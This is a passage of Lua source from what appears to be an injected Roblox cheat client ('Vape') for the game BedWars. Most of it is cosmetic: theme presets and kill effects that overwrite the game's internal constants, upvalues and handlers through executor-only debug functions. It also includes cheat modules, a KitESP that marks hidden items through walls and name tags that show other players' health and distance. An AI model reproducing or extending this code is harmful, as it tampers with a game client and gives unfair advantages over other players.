					["TELEPEARL_THROW"] = "rbxassetid://6866223756",
					["TELEPEARL_LAND"] = "rbxassetid://6866223798",
					["CROSSBOW_RELOAD"] = "rbxassetid://6869254094",
					["VOICE_1"] = "rbxassetid://5283866929",
					["VOICE_2"] = "rbxassetid://5283867710",
					["VOICE_HONK"] = "rbxassetid://5283872555",
					["FORTIFY_BLOCK"] = "rbxassetid://6955762535",
					["EAT_FOOD_1"] = "rbxassetid://4968170636",
					["KILL"] = "rbxassetid://7013482008",
					["ZIPLINE_TRAVEL"] = "rbxassetid://7047882304",
					["ZIPLINE_LATCH"] = "rbxassetid://7047882233",
					["ZIPLINE_UNLATCH"] = "rbxassetid://7047882265",
					["SHIELD_BLOCKED"] = "rbxassetid://6955762535",
					["GUITAR_LOOP"] = "rbxassetid://7084168540",
					["GUITAR_HEAL_1"] = "rbxassetid://7084168458",
					["CANNON_MOVE"] = "rbxassetid://7118668472",
					["CANNON_FIRE"] = "rbxassetid://7121064180",
					["BALLOON_INFLATE"] = "rbxassetid://7118657911",
					["BALLOON_POP"] = "rbxassetid://7118657873",
					["FIREBALL_THROW"] = "rbxassetid://7192289445",
					["LASSO_HIT"] = "rbxassetid://7192289603",
					["LASSO_SWING"] = "rbxassetid://7192289504",
					["LASSO_THROW"] = "rbxassetid://7192289548",
					["GRIM_REAPER_CONSUME"] = "rbxassetid://7225389554",
					["GRIM_REAPER_CHANNEL"] = "rbxassetid://7225389512",
					["TV_STATIC"] = "rbxassetid://7256209920",
					["TURRET_ON"] = "rbxassetid://7290176291",
					["TURRET_OFF"] = "rbxassetid://7290176380",
					["TURRET_ROTATE"] = "rbxassetid://7290176421",
					["TURRET_SHOOT"] = "rbxassetid://7290187805",
					["WIZARD_LIGHTNING_CAST"] = "rbxassetid://7262989886",
					["WIZARD_LIGHTNING_LAND"] = "rbxassetid://7263165647",
					["WIZARD_LIGHTNING_STRIKE"] = "rbxassetid://7263165347",
					["WIZARD_ORB_CAST"] = "rbxassetid://7263165448",
					["WIZARD_ORB_TRAVEL_LOOP"] = "rbxassetid://7263165579",
					["WIZARD_ORB_CONTACT_LOOP"] = "rbxassetid://7263165647",
					["BATTLE_PASS_PROGRESS_LEVEL_UP"] = "rbxassetid://7331597283",
					["BATTLE_PASS_PROGRESS_EXP_GAIN"] = "rbxassetid://7331597220",
					["FLAMETHROWER_UPGRADE"] = "rbxassetid://7310273053",
					["FLAMETHROWER_USE"] = "rbxassetid://7310273125",
					["BRITTLE_HIT"] = "rbxassetid://7310273179",
					["EXTINGUISH"] = "rbxassetid://7310273015",
					["RAVEN_SPACE_AMBIENT"] = "rbxassetid://7341443286",
					["RAVEN_WING_FLAP"] = "rbxassetid://7341443378",
					["RAVEN_CAW"] = "rbxassetid://7341443447",
					["JADE_HAMMER_THUD"] = "rbxassetid://7342299402",
					["STATUE"] = "rbxassetid://7344166851",
					["CONFETTI"] = "rbxassetid://7344278405",
					["HEART"] = "rbxassetid://7345120916",
					["SPRAY"] = "rbxassetid://7361499529",
					["BEEHIVE_PRODUCE"] = "rbxassetid://7378100183",
					["DEPOSIT_BEE"] = "rbxassetid://7378100250",
					["CATCH_BEE"] = "rbxassetid://7378100305",
					["BEE_NET_SWING"] = "rbxassetid://7378100350",
					["ASCEND"] = "rbxassetid://7378387334",
					["BED_ALARM"] = "rbxassetid://7396762708",
					["BOUNTY_CLAIMED"] = "rbxassetid://7396751941",
					["BOUNTY_ASSIGNED"] = "rbxassetid://7396752155",
					["BAGUETTE_HIT"] = "rbxassetid://7396760547",
					["BAGUETTE_SWING"] = "rbxassetid://7396760496",
					["TESLA_ZAP"] = "rbxassetid://7497477336",
					["SPIRIT_TRIGGERED"] = "rbxassetid://7498107251",
					["SPIRIT_EXPLODE"] = "rbxassetid://7498107327",
					["ANGEL_LIGHT_ORB_CREATE"] = "rbxassetid://7552134231",
					["ANGEL_LIGHT_ORB_HEAL"] = "rbxassetid://7552134868",
					["ANGEL_VOID_ORB_CREATE"] = "rbxassetid://7552135942",
					["ANGEL_VOID_ORB_HEAL"] = "rbxassetid://7552136927",
					["DODO_BIRD_JUMP"] = "rbxassetid://7618085391",
					["DODO_BIRD_DOUBLE_JUMP"] = "rbxassetid://7618085771",
					["DODO_BIRD_MOUNT"] = "rbxassetid://7618085486",
					["DODO_BIRD_DISMOUNT"] = "rbxassetid://7618085571",
					["DODO_BIRD_SQUAWK_1"] = "rbxassetid://7618085870",
					["DODO_BIRD_SQUAWK_2"] = "rbxassetid://7618085657",
					["SHIELD_CHARGE_START"] = "rbxassetid://7730842884",
					["SHIELD_CHARGE_LOOP"] = "rbxassetid://7730843006",
					["SHIELD_CHARGE_BASH"] = "rbxassetid://7730843142",
					["ROCKET_LAUNCHER_FIRE"] = "rbxassetid://7681584765",
					["ROCKET_LAUNCHER_FLYING_LOOP"] = "rbxassetid://7681584906",
					["SMOKE_GRENADE_POP"] = "rbxassetid://7681276062",
					["SMOKE_GRENADE_EMIT_LOOP"] = "rbxassetid://7681276135",
					["GOO_SPIT"] = "rbxassetid://7807271610",
					["GOO_SPLAT"] = "rbxassetid://7807272724",
					["GOO_EAT"] = "rbxassetid://7813484049",
					["LUCKY_BLOCK_BREAK"] = "rbxassetid://7682005357",
					["AXOLOTL_SWITCH_TARGETS"] = "rbxassetid://7344278405",
					["HALLOWEEN_MUSIC"] = "rbxassetid://7775602786",
					["SNAP_TRAP_SETUP"] = "rbxassetid://7796078515",
					["SNAP_TRAP_CLOSE"] = "rbxassetid://7796078695",
					["SNAP_TRAP_CONSUME_MARK"] = "rbxassetid://7796078825",
					["GHOST_VACUUM_SUCKING_LOOP"] = "rbxassetid://7814995865",
					["GHOST_VACUUM_SHOOT"] = "rbxassetid://7806060367",
					["GHOST_VACUUM_CATCH"] = "rbxassetid://7815151688",
					["FISHERMAN_GAME_START"] = "rbxassetid://7806060544",
					["FISHERMAN_GAME_PULLING_LOOP"] = "rbxassetid://7806060638",
					["FISHERMAN_GAME_PROGRESS_INCREASE"] = "rbxassetid://7806060745",
					["FISHERMAN_GAME_FISH_MOVE"] = "rbxassetid://7806060863",
					["FISHERMAN_GAME_LOOP"] = "rbxassetid://7806061057",
					["FISHING_ROD_CAST"] = "rbxassetid://7806060976",
					["FISHING_ROD_SPLASH"] = "rbxassetid://7806061193",
					["SPEAR_HIT"] = "rbxassetid://7807270398",
					["SPEAR_THROW"] = "rbxassetid://7813485044",
				}
				for i,v in pairs(bedwars.CombatController.killSounds) do 
					bedwars.CombatController.killSounds[i] = oldbedwarssoundtable.KILL
				end
				for i,v in pairs(bedwars.CombatController.multiKillLoops) do 
					bedwars.CombatController.multiKillLoops[i] = ""
				end
				for i,v in pairs(bedwars.ItemTable) do 
					if oldbedwarsicontab[i] then 
						v.image = oldbedwarsicontab[i]
					end
				end			
				for i,v in pairs(oldbedwarssoundtable) do 
					local item = bedwars.SoundList[i]
					if item then
						bedwars.SoundList[i] = v
					end
				end	
				local damagetab = debug.getupvalue(bedwars.DamageIndicator, 2)
				damagetab.strokeThickness = false
				damagetab.textSize = 32
				damagetab.blowUpDuration = 0
				damagetab.baseColor = Color3.fromRGB(214, 0, 0)
				damagetab.blowUpSize = 32
				damagetab.blowUpCompleteDuration = 0
				damagetab.anchoredDuration = 0
				debug.setconstant(bedwars.ViewmodelController.show, 37, "")
				debug.setconstant(bedwars.DamageIndicator, 83, Enum.Font.LuckiestGuy)
				debug.setconstant(bedwars.DamageIndicator, 102, "Enabled")
				debug.setconstant(bedwars.DamageIndicator, 118, 0.3)
				debug.setconstant(bedwars.DamageIndicator, 128, 0.5)
				debug.setupvalue(bedwars.DamageIndicator, 10, {
					Create = function(self, obj, ...)
						task.spawn(function()
							obj.Parent.Parent.Parent.Parent.Velocity = Vector3.new((math.random(-50, 50) / 100) * damagetab.velX, (math.random(50, 60) / 100) * damagetab.velY, (math.random(-50, 50) / 100) * damagetab.velZ)
							local textcompare = obj.Parent.TextColor3
							if textcompare ~= Color3.fromRGB(85, 255, 85) then
								local newtween = tweenService:Create(obj.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
									TextColor3 = (textcompare == Color3.fromRGB(76, 175, 93) and Color3.new(0, 0, 0) or Color3.new(1, 1, 1))
								})
								task.wait(0.15)
								newtween:Play()
							end
						end)
						return tweenService:Create(obj, ...)
					end
				})
				sethiddenproperty(lightingService, "Technology", "ShadowMap")
				lightingService.Ambient = Color3.fromRGB(69, 69, 69)
				lightingService.Brightness = 3
				lightingService.EnvironmentDiffuseScale = 1
				lightingService.EnvironmentSpecularScale = 1
				lightingService.OutdoorAmbient = Color3.fromRGB(69, 69, 69)
				lightingService.Atmosphere.Density = 0.1
				lightingService.Atmosphere.Offset = 0.25
				lightingService.Atmosphere.Color = Color3.fromRGB(198, 198, 198)
				lightingService.Atmosphere.Decay = Color3.fromRGB(104, 112, 124)
				lightingService.Atmosphere.Glare = 0
				lightingService.Atmosphere.Haze = 0
				lightingService.ClockTime = 13
				lightingService.GeographicLatitude = 0
				lightingService.GlobalShadows = false
				lightingService.TimeOfDay = "13:00:00"
				lightingService.Sky.SkyboxBk = "rbxassetid://7018684000"
				lightingService.Sky.SkyboxDn = "rbxassetid://6334928194"
				lightingService.Sky.SkyboxFt = "rbxassetid://7018684000"
				lightingService.Sky.SkyboxLf = "rbxassetid://7018684000"
				lightingService.Sky.SkyboxRt = "rbxassetid://7018684000"
				lightingService.Sky.SkyboxUp = "rbxassetid://7018689553"
			end)
		end,
		Winter = function() 
			task.spawn(function()
				for i,v in pairs(lightingService:GetChildren()) do
					if v:IsA("Atmosphere") or v:IsA("Sky") or v:IsA("PostEffect") then
						v:Remove()
					end
				end
				local sky = Instance.new("Sky")
				sky.StarCount = 5000
				sky.SkyboxUp = "rbxassetid://8139676647"
				sky.SkyboxLf = "rbxassetid://8139676988"
				sky.SkyboxFt = "rbxassetid://8139677111"
				sky.SkyboxBk = "rbxassetid://8139677359"
				sky.SkyboxDn = "rbxassetid://8139677253"
				sky.SkyboxRt = "rbxassetid://8139676842"
				sky.SunTextureId = "rbxassetid://6196665106"
				sky.SunAngularSize = 11
				sky.MoonTextureId = "rbxassetid://8139665943"
				sky.MoonAngularSize = 30
				sky.Parent = lightingService
				local sunray = Instance.new("SunRaysEffect")
				sunray.Intensity = 0.03
				sunray.Parent = lightingService
				local bloom = Instance.new("BloomEffect")
				bloom.Threshold = 2
				bloom.Intensity = 1
				bloom.Size = 2
				bloom.Parent = lightingService
				local atmosphere = Instance.new("Atmosphere")
				atmosphere.Density = 0.3
				atmosphere.Offset = 0.25
				atmosphere.Color = Color3.fromRGB(198, 198, 198)
				atmosphere.Decay = Color3.fromRGB(104, 112, 124)
				atmosphere.Glare = 0
				atmosphere.Haze = 0
				atmosphere.Parent = lightingService
				local damagetab = debug.getupvalue(bedwars.DamageIndicator, 2)
				damagetab.strokeThickness = false
				damagetab.textSize = 32
				damagetab.blowUpDuration = 0
				damagetab.baseColor = Color3.fromRGB(70, 255, 255)
				damagetab.blowUpSize = 32
				damagetab.blowUpCompleteDuration = 0
				damagetab.anchoredDuration = 0
				debug.setconstant(bedwars.DamageIndicator, 83, Enum.Font.LuckiestGuy)
				debug.setconstant(bedwars.DamageIndicator, 102, "Enabled")
				debug.setconstant(bedwars.DamageIndicator, 118, 0.3)
				debug.setconstant(bedwars.DamageIndicator, 128, 0.5)
				debug.setupvalue(bedwars.DamageIndicator, 10, {
					Create = function(self, obj, ...)
						task.spawn(function()
							obj.Parent.Parent.Parent.Parent.Velocity = Vector3.new((math.random(-50, 50) / 100) * damagetab.velX, (math.random(50, 60) / 100) * damagetab.velY, (math.random(-50, 50) / 100) * damagetab.velZ)
							local textcompare = obj.Parent.TextColor3
							if textcompare ~= Color3.fromRGB(85, 255, 85) then
								local newtween = tweenService:Create(obj.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
									TextColor3 = (textcompare == Color3.fromRGB(76, 175, 93) and Color3.new(1, 1, 1) or Color3.new(0, 0, 0))
								})
								task.wait(0.15)
								newtween:Play()
							end
						end)
						return tweenService:Create(obj, ...)
					end
				})
				debug.setconstant(require(lplr.PlayerScripts.TS.controllers.global.hotbar.ui.healthbar["hotbar-healthbar"]).HotbarHealthbar.render, 16, 4653055)
			end)
			task.spawn(function()
				local snowpart = Instance.new("Part")
				snowpart.Size = Vector3.new(240, 0.5, 240)
				snowpart.Name = "SnowParticle"
				snowpart.Transparency = 1
				snowpart.CanCollide = false
				snowpart.Position = Vector3.new(0, 120, 286)
				snowpart.Anchored = true
				snowpart.Parent = workspace
				local snow = Instance.new("ParticleEmitter")
				snow.RotSpeed = NumberRange.new(300)
				snow.VelocitySpread = 35
				snow.Rate = 28
				snow.Texture = "rbxassetid://8158344433"
				snow.Rotation = NumberRange.new(110)
				snow.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0.16939899325371,0),NumberSequenceKeypoint.new(0.23365999758244,0.62841498851776,0.37158501148224),NumberSequenceKeypoint.new(0.56209099292755,0.38797798752785,0.2771390080452),NumberSequenceKeypoint.new(0.90577298402786,0.51912599802017,0),NumberSequenceKeypoint.new(1,1,0)})
				snow.Lifetime = NumberRange.new(8,14)
				snow.Speed = NumberRange.new(8,18)
				snow.EmissionDirection = Enum.NormalId.Bottom
				snow.SpreadAngle = Vector2.new(35,35)
				snow.Size = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(0.039760299026966,1.3114800453186,0.32786899805069),NumberSequenceKeypoint.new(0.7554469704628,0.98360699415207,0.44038599729538),NumberSequenceKeypoint.new(1,0,0)})
				snow.Parent = snowpart
				local windsnow = Instance.new("ParticleEmitter")
				windsnow.Acceleration = Vector3.new(0,0,1)
				windsnow.RotSpeed = NumberRange.new(100)
				windsnow.VelocitySpread = 35
				windsnow.Rate = 28
				windsnow.Texture = "rbxassetid://8158344433"
				windsnow.EmissionDirection = Enum.NormalId.Bottom
				windsnow.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0.16939899325371,0),NumberSequenceKeypoint.new(0.23365999758244,0.62841498851776,0.37158501148224),NumberSequenceKeypoint.new(0.56209099292755,0.38797798752785,0.2771390080452),NumberSequenceKeypoint.new(0.90577298402786,0.51912599802017,0),NumberSequenceKeypoint.new(1,1,0)})
				windsnow.Lifetime = NumberRange.new(8,14)
				windsnow.Speed = NumberRange.new(8,18)
				windsnow.Rotation = NumberRange.new(110)
				windsnow.SpreadAngle = Vector2.new(35,35)
				windsnow.Size = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(0.039760299026966,1.3114800453186,0.32786899805069),NumberSequenceKeypoint.new(0.7554469704628,0.98360699415207,0.44038599729538),NumberSequenceKeypoint.new(1,0,0)})
				windsnow.Parent = snowpart
				repeat
					task.wait()
					if entityLibrary.isAlive then 
						snowpart.Position = entityLibrary.character.HumanoidRootPart.Position + Vector3.new(0, 100, 0)
					end
				until not vapeInjected
			end)
		end,
		Halloween = function()
			task.spawn(function()
				for i,v in pairs(lightingService:GetChildren()) do
					if v:IsA("Atmosphere") or v:IsA("Sky") or v:IsA("PostEffect") then
						v:Remove()
					end
				end
				lightingService.TimeOfDay = "00:00:00"
				pcall(function() workspace.Clouds:Destroy() end)
				local damagetab = debug.getupvalue(bedwars.DamageIndicator, 2)
				damagetab.strokeThickness = false
				damagetab.textSize = 32
				damagetab.blowUpDuration = 0
				damagetab.baseColor = Color3.fromRGB(255, 100, 0)
				damagetab.blowUpSize = 32
				damagetab.blowUpCompleteDuration = 0
				damagetab.anchoredDuration = 0
				debug.setconstant(bedwars.DamageIndicator, 83, Enum.Font.LuckiestGuy)
				debug.setconstant(bedwars.DamageIndicator, 102, "Enabled")
				debug.setconstant(bedwars.DamageIndicator, 118, 0.3)
				debug.setconstant(bedwars.DamageIndicator, 128, 0.5)
				debug.setupvalue(bedwars.DamageIndicator, 10, {
					Create = function(self, obj, ...)
						task.spawn(function()
							obj.Parent.Parent.Parent.Parent.Velocity = Vector3.new((math.random(-50, 50) / 100) * damagetab.velX, (math.random(50, 60) / 100) * damagetab.velY, (math.random(-50, 50) / 100) * damagetab.velZ)
							local textcompare = obj.Parent.TextColor3
							if textcompare ~= Color3.fromRGB(85, 255, 85) then
								local newtween = tweenService:Create(obj.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
									TextColor3 = (textcompare == Color3.fromRGB(76, 175, 93) and Color3.new(0, 0, 0) or Color3.new(0, 0, 0))
								})
								task.wait(0.15)
								newtween:Play()
							end
						end)
						return tweenService:Create(obj, ...)
					end
				})
				local colorcorrection = Instance.new("ColorCorrectionEffect")
				colorcorrection.TintColor = Color3.fromRGB(255, 185, 81)
				colorcorrection.Brightness = 0.05
				colorcorrection.Parent = lightingService
				debug.setconstant(require(lplr.PlayerScripts.TS.controllers.global.hotbar.ui.healthbar["hotbar-healthbar"]).HotbarHealthbar.render, 16, 16737280)
			end)
		end,
		Valentines = function()
			task.spawn(function()
				for i,v in pairs(lightingService:GetChildren()) do
					if v:IsA("Atmosphere") or v:IsA("Sky") or v:IsA("PostEffect") then
						v:Remove()
					end
				end
				local sky = Instance.new("Sky")
				sky.SkyboxBk = "rbxassetid://1546230803"
				sky.SkyboxDn = "rbxassetid://1546231143"
				sky.SkyboxFt = "rbxassetid://1546230803"
				sky.SkyboxLf = "rbxassetid://1546230803"
				sky.SkyboxRt = "rbxassetid://1546230803"
				sky.SkyboxUp = "rbxassetid://1546230451"
				sky.Parent = lightingService
				pcall(function() workspace.Clouds:Destroy() end)
				local damagetab = debug.getupvalue(bedwars.DamageIndicator, 2)
				damagetab.strokeThickness = false
				damagetab.textSize = 32
				damagetab.blowUpDuration = 0
				damagetab.baseColor = Color3.fromRGB(255, 132, 178)
				damagetab.blowUpSize = 32
				damagetab.blowUpCompleteDuration = 0
				damagetab.anchoredDuration = 0
				debug.setconstant(bedwars.DamageIndicator, 83, Enum.Font.LuckiestGuy)
				debug.setconstant(bedwars.DamageIndicator, 102, "Enabled")
				debug.setconstant(bedwars.DamageIndicator, 118, 0.3)
				debug.setconstant(bedwars.DamageIndicator, 128, 0.5)
				debug.setupvalue(bedwars.DamageIndicator, 10, {
					Create = function(self, obj, ...)
						task.spawn(function()
							obj.Parent.Parent.Parent.Parent.Velocity = Vector3.new((math.random(-50, 50) / 100) * damagetab.velX, (math.random(50, 60) / 100) * damagetab.velY, (math.random(-50, 50) / 100) * damagetab.velZ)
							local textcompare = obj.Parent.TextColor3
							if textcompare ~= Color3.fromRGB(85, 255, 85) then
								local newtween = tweenService:Create(obj.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
									TextColor3 = (textcompare == Color3.fromRGB(76, 175, 93) and Color3.new(0, 0, 0) or Color3.new(0, 0, 0))
								})
								task.wait(0.15)
								newtween:Play()
							end
						end)
						return tweenService:Create(obj, ...)
					end
				})
				local colorcorrection = Instance.new("ColorCorrectionEffect")
				colorcorrection.TintColor = Color3.fromRGB(255, 199, 220)
				colorcorrection.Brightness = 0.05
				colorcorrection.Parent = lightingService
				debug.setconstant(require(lplr.PlayerScripts.TS.controllers.global.hotbar.ui.healthbar["hotbar-healthbar"]).HotbarHealthbar.render, 16, 16745650)
			end)
		end
	}

	GameTheme = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
		Name = "GameTheme",
		Function = function(callback) 
			if callback then 
				if not transformed then
					transformed = true
					themefunctions[GameThemeMode.Value]()
				else
					GameTheme.ToggleButton(false)
				end
			else
				warningNotification("GameTheme", "Disabled Next Game", 10)
			end
		end,
		ExtraText = function()
			return GameThemeMode.Value
		end
	})
	GameThemeMode = GameTheme.CreateDropdown({
		Name = "Theme",
		Function = function() end,
		List = {"Old", "Winter", "Halloween", "Valentines"}
	})
end)

runFunction(function()
	local oldkilleffect
	local KillEffectMode = {Value = "Gravity"}
	local KillEffectList = {Value = "None"}
	local KillEffectName2 = {}
	local killeffects = {
		Gravity = function(p3, p4, p5, p6)
			p5:BreakJoints()
			task.spawn(function()
				local partvelo = {}
				for i,v in pairs(p5:GetDescendants()) do 
					if v:IsA("BasePart") then 
						partvelo[v.Name] = v.Velocity * 3
					end
				end
				p5.Archivable = true
				local clone = p5:Clone()
				clone.Humanoid.Health = 100
				clone.Parent = workspace
				local nametag = clone:FindFirstChild("Nametag", true)
				if nametag then nametag:Destroy() end
				game:GetService("Debris"):AddItem(clone, 30)
				p5:Destroy()
				task.wait(0.01)
				clone.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
				clone:BreakJoints()
				task.wait(0.01)
				for i,v in pairs(clone:GetDescendants()) do 
					if v:IsA("BasePart") then 
						local bodyforce = Instance.new("BodyForce")
						bodyforce.Force = Vector3.new(0, (workspace.Gravity - 10) * v:GetMass(), 0)
						bodyforce.Parent = v
						v.CanCollide = true
						v.Velocity = partvelo[v.Name] or Vector3.zero
					end
				end
			end)
		end,
		Lightning = function(p3, p4, p5, p6)
			p5:BreakJoints()
			local startpos = 1125
			local startcf = p5.PrimaryPart.CFrame.p - Vector3.new(0, 8, 0)
			local newpos = Vector3.new((math.random(1, 10) - 5) * 2, startpos, (math.random(1, 10) - 5) * 2)
			for i = startpos - 75, 0, -75 do 
				local newpos2 = Vector3.new((math.random(1, 10) - 5) * 2, i, (math.random(1, 10) - 5) * 2)
				if i == 0 then 
					newpos2 = Vector3.zero
				end
				local part = Instance.new("Part")
				part.Size = Vector3.new(1.5, 1.5, 77)
				part.Material = Enum.Material.SmoothPlastic
				part.Anchored = true
				part.Material = Enum.Material.Neon
				part.CanCollide = false
				part.CFrame = CFrame.new(startcf + newpos + ((newpos2 - newpos) * 0.5), startcf + newpos2)
				part.Parent = workspace
				local part2 = part:Clone()
				part2.Size = Vector3.new(3, 3, 78)
				part2.Color = Color3.new(0.7, 0.7, 0.7)
				part2.Transparency = 0.7
				part2.Material = Enum.Material.SmoothPlastic
				part2.Parent = workspace
				game:GetService("Debris"):AddItem(part, 0.5)
				game:GetService("Debris"):AddItem(part2, 0.5)
				bedwars.QueryUtil:setQueryIgnored(part, true)
				bedwars.QueryUtil:setQueryIgnored(part2, true)
				if i == 0 then 
					local soundpart = Instance.new("Part")
					soundpart.Transparency = 1
					soundpart.Anchored = true 
					soundpart.Size = Vector3.zero
					soundpart.Position = startcf
					soundpart.Parent = workspace
					bedwars.QueryUtil:setQueryIgnored(soundpart, true)
					local sound = Instance.new("Sound")
					sound.SoundId = "rbxassetid://6993372814"
					sound.Volume = 2
					sound.Pitch = 0.5 + (math.random(1, 3) / 10)
					sound.Parent = soundpart
					sound:Play()
					sound.Ended:Connect(function()
						soundpart:Destroy()
					end)
				end
				newpos = newpos2
			end
		end
	}
	local KillEffectName = {}
	for i,v in pairs(bedwars.KillEffectMeta) do 
		table.insert(KillEffectName, v.name)
		KillEffectName[v.name] = i
	end
	table.sort(KillEffectName, function(a, b) return a:lower() < b:lower() end)
	local KillEffect = {Enabled = false}
	KillEffect = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
		Name = "KillEffect",
		Function = function(callback)
			if callback then 
				task.spawn(function()
					repeat task.wait() until bedwarsStore.matchState ~= 0 or not KillEffect.Enabled
					if KillEffect.Enabled then
						lplr:SetAttribute("KillEffectType", "none")
						if KillEffectMode.Value == "Bedwars" then 
							lplr:SetAttribute("KillEffectType", KillEffectName[KillEffectList.Value])
						end
					end
				end)
				oldkilleffect = bedwars.DefaultKillEffect.onKill
				bedwars.DefaultKillEffect.onKill = function(p3, p4, p5, p6)
					killeffects[KillEffectMode.Value](p3, p4, p5, p6)
				end
			else
				bedwars.DefaultKillEffect.onKill = oldkilleffect
			end
		end
	})
	local modes = {"Bedwars"}
	for i,v in pairs(killeffects) do 
		table.insert(modes, i)
	end
	KillEffectMode = KillEffect.CreateDropdown({
		Name = "Mode",
		Function = function() 
			if KillEffect.Enabled then 
				KillEffect.ToggleButton(false)
				KillEffect.ToggleButton(false)
			end
		end,
		List = modes
	})
	KillEffectList = KillEffect.CreateDropdown({
		Name = "Bedwars",
		Function = function() 
			if KillEffect.Enabled then 
				KillEffect.ToggleButton(false)
				KillEffect.ToggleButton(false)
			end
		end,
		List = KillEffectName
	})
end)

runFunction(function()
	local KitESP = {Enabled = false}
	local espobjs = {}
	local espfold = Instance.new("Folder")
	espfold.Parent = GuiLibrary.MainGui

	local function espadd(v, icon)
		local billboard = Instance.new("BillboardGui")
		billboard.Parent = espfold
		billboard.Name = "iron"
		billboard.StudsOffsetWorldSpace = Vector3.new(0, 3, 1.5)
		billboard.Size = UDim2.new(0, 32, 0, 32)
		billboard.AlwaysOnTop = true
		billboard.Adornee = v
		local image = Instance.new("ImageLabel")
		image.BackgroundTransparency = 0.5
		image.BorderSizePixel = 0
		image.Image = bedwars.getIcon({itemType = icon}, true)
		image.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		image.Size = UDim2.new(0, 32, 0, 32)
		image.AnchorPoint = Vector2.new(0.5, 0.5)
		image.Parent = billboard
		local uicorner = Instance.new("UICorner")
		uicorner.CornerRadius = UDim.new(0, 4)
		uicorner.Parent = image
		espobjs[v] = billboard
	end

	local function addKit(tag, icon)
		table.insert(KitESP.Connections, collectionService:GetInstanceAddedSignal(tag):Connect(function(v)
			espadd(v.PrimaryPart, icon)
		end))
		table.insert(KitESP.Connections, collectionService:GetInstanceRemovedSignal(tag):Connect(function(v)
			if espobjs[v.PrimaryPart] then
				espobjs[v.PrimaryPart]:Destroy()
				espobjs[v.PrimaryPart] = nil
			end
		end))
		for i,v in pairs(collectionService:GetTagged(tag)) do 
			espadd(v.PrimaryPart, icon)
		end
	end

	KitESP = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
		Name = "KitESP",
		Function = function(callback) 
			if callback then
				task.spawn(function()
					repeat task.wait() until bedwarsStore.equippedKit ~= ""
					if KitESP.Enabled then
						if bedwarsStore.equippedKit == "metal_detector" then
							addKit("hidden-metal", "iron")
						elseif bedwarsStore.equippedKit == "beekeeper" then
							addKit("bee", "bee")
						elseif bedwarsStore.equippedKit == "bigman" then
							addKit("treeOrb", "natures_essence_1")
						end
					end
				end)
			else
				espfold:ClearAllChildren()
				table.clear(espobjs)
			end
		end
	})
end)

runFunction(function()
	local function floorNameTagPosition(pos)
		return Vector2.new(math.floor(pos.X), math.floor(pos.Y))
	end

	local function removeTags(str)
        str = str:gsub("<br%s*/>", "\n")
        return (str:gsub("<[^<>]->", ""))
    end

	local NameTagsFolder = Instance.new("Folder")
	NameTagsFolder.Name = "NameTagsFolder"
	NameTagsFolder.Parent = GuiLibrary.MainGui
	local nametagsfolderdrawing = {}
	local NameTagsColor = {Value = 0.44}
	local NameTagsDisplayName = {Enabled = false}
	local NameTagsHealth = {Enabled = false}
	local NameTagsDistance = {Enabled = false}
	local NameTagsBackground = {Enabled = true}
	local NameTagsScale = {Value = 10}
	local NameTagsFont = {Value = "SourceSans"}
	local NameTagsTeammates = {Enabled = true}
	local NameTagsShowInventory = {Enabled = false}
	local NameTagsRangeLimit = {Value = 0}
	local fontitems = {"SourceSans"}
	local nametagstrs = {}
	local nametagsizes = {}
	local kititems = {
		jade = "jade_hammer",
		archer = "tactical_crossbow",
		angel = "",
		cowgirl = "lasso",
		dasher = "wood_dao",
		axolotl = "axolotl",
		yeti = "snowball",
		smoke = "smoke_block",
		trapper = "snap_trap",
		pyro = "flamethrower",
		davey = "cannon",
		regent = "void_axe", 
		baker = "apple",
		builder = "builder_hammer",
		farmer_cletus = "carrot_seeds",
		melody = "guitar",
		barbarian = "rageblade",
		gingerbread_man = "gumdrop_bounce_pad",
		spirit_catcher = "spirit",
		fisherman = "fishing_rod",
		oil_man = "oil_consumable",
		santa = "tnt",
		miner = "miner_pickaxe",
		sheep_herder = "crook",
		beast = "speed_potion",
		metal_detector = "metal_detector",
		cyber = "drone",
		vesta = "damage_banner",
		lumen = "light_sword",
		ember = "infernal_saber",
		queen_bee = "bee"
	}

	local nametagfuncs1 = {
		Normal = function(plr)
			if NameTagsTeammates.Enabled and (not plr.Targetable) and (not plr.Friend) then return end
			local thing = Instance.new("TextLabel")
			thing.BackgroundColor3 = Color3.new()
			thing.BorderSizePixel = 0
			thing.Visible = false
			thing.RichText = true
			thing.AnchorPoint = Vector2.new(0.5, 1)
			thing.Name = plr.Player.Name
			thing.Font = Enum.Font[NameTagsFont.Value]
			thing.TextSize = 14 * (NameTagsScale.Value / 10)
			thing.BackgroundTransparency = NameTagsBackground.Enabled and 0.5 or 1
			nametagstrs[plr.Player] = WhitelistFunctions:GetTag(plr.Player)..(NameTagsDisplayName.Enabled and plr.Player.DisplayName or plr.Player.Name)
			if NameTagsHealth.Enabled then
				local color = Color3.fromHSV(math.clamp(plr.Humanoid.Health / plr.Humanoid.MaxHealth, 0, 1) / 2.5, 0.89, 1)
				nametagstrs[plr.Player] = nametagstrs[plr.Player]..' <font color="rgb('..tostring(math.floor(color.R * 255))..','..tostring(math.floor(color.G * 255))..','..tostring(math.floor(color.B * 255))..')">'..math.round(plr.Humanoid.Health).."</font>"
			end
			if NameTagsDistance.Enabled then 
				nametagstrs[plr.Player] = '<font color="rgb(85, 255, 85)">[</font><font color="rgb(255, 255, 255)">%s</font><font color="rgb(85, 255, 85)">]</font> '..nametagstrs[plr.Player]
			end
			local nametagSize = textService:GetTextSize(removeTags(nametagstrs[plr.Player]), thing.TextSize, thing.Font, Vector2.new(100000, 100000))
			thing.Size = UDim2.new(0, nametagSize.X + 4, 0, nametagSize.Y)
			thing.Text = nametagstrs[plr.Player]
